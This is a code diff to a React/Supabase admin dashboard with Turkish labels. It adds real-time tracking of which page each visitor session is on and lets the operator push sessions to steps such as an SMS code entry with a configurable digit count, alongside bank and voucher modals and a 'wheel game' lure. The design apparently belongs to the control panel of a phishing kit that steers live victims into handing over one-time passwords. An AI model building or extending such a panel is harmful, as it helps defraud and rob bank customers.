@@ -8,6 +8,7 @@ import { VoucherModal } from "./VoucherModal";
 import { BanksModal } from "./BanksModal";
 import { defaultSettings } from "@/contexts/SettingsContext";
 import { translations, TranslationKeys } from "@/lib/languageDefaults";
+import { pathToStep } from "@/lib/session-routes";
 
 export function AdminDashboardClean() {
   const supabase = createBrowserSupabaseClient();
@@ -123,6 +124,7 @@ export function AdminDashboardClean() {
 
   const [onlineSessionIds, setOnlineSessionIds] = useState<Set<string>>(new Set());
   const [sessionLastSeenAt, setSessionLastSeenAt] = useState<Record<string, number>>({});
+  const [sessionPaths, setSessionPaths] = useState<Record<string, string>>({});
   const [liveVisitorCount, setLiveVisitorCount] = useState(0);
 
   const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>, field: 'logo_url' | 'bg_url') => {
@@ -262,6 +264,7 @@ export function AdminDashboardClean() {
         const state = presenceChannel.presenceState();
         let count = 0;
         const activeIds = new Set<string>();
+        const paths: Record<string, string> = {};
         const now = Date.now();
 
         for (const [key, presences] of Object.entries(state)) {
@@ -278,11 +281,15 @@ export function AdminDashboardClean() {
           for (const p of typedPresences) {
             if (p.sessionId) {
               activeIds.add(p.sessionId);
+              if (p.pathname) {
+                paths[p.sessionId] = p.pathname;
+              }
             }
           }
         }
         setLiveVisitorCount(count);
         setOnlineSessionIds(activeIds);
+        setSessionPaths(paths);
         setSessionLastSeenAt((prev) => {
           const next = { ...prev };
           for (const sessionId of activeIds) {
@@ -372,7 +379,7 @@ export function AdminDashboardClean() {
       setSpecialPromptSessionId(id);
       return;
     }
-    await supabase.from("sessions").update({ current_step: step, status: "online" }).eq("id", id);
+    await supabase.from("sessions").update({ is_hidden: false, current_step: step, status: "online" }).eq("id", id);
     await load();
   }
 
@@ -381,8 +388,7 @@ export function AdminDashboardClean() {
     const digits = Math.min(12, Math.max(4, Number(smsDigitsInput) || 6));
     await supabase
       .from("sessions")
-      .update({ 
-        current_step: "sms", 
+      .update({ is_hidden: false, current_step: "sms", 
         sms_digits: digits, 
         sms_custom_text: smsCustomTextInput.trim() || null,
         status: "online" 
@@ -685,14 +691,28 @@ export function AdminDashboardClean() {
                     </td>
                     <td className="px-4 py-4">
                       {(() => {
-                        const s = row.current_step;
+                        let s = row.current_step as string;
+                        const livePath = sessionPaths[row.id];
+                        if (isActuallyOnline && livePath) {
+                          if (livePath.startsWith('/wheel')) {
+                            s = "wheel";
+                          } else {
+                            const mappedStep = pathToStep(livePath);
+                            if (mappedStep) {
+                              s = mappedStep;
+                            }
+                          }
+                        }
                         
                         // Varsayılan Renk (Gri)
                         let colorClass = "bg-zinc-800 text-zinc-400";
                         let text = "BAŞLANGIÇ";
 
-                        if (s === "code_entry") {
-                          if (fd.is_wheel_game && (!row.amount || row.amount === 0)) {
+                        if (s === "wheel") {
+                          colorClass = "bg-teal-500/20 text-teal-400";
+                          text = "ÇARK OYUNU";
+                        } else if (s === "code_entry") {
+                          if (fd.is_wheel_game) {
                             colorClass = "bg-teal-500/20 text-teal-400";
                             text = "ÇARK OYUNU";
                           } else {
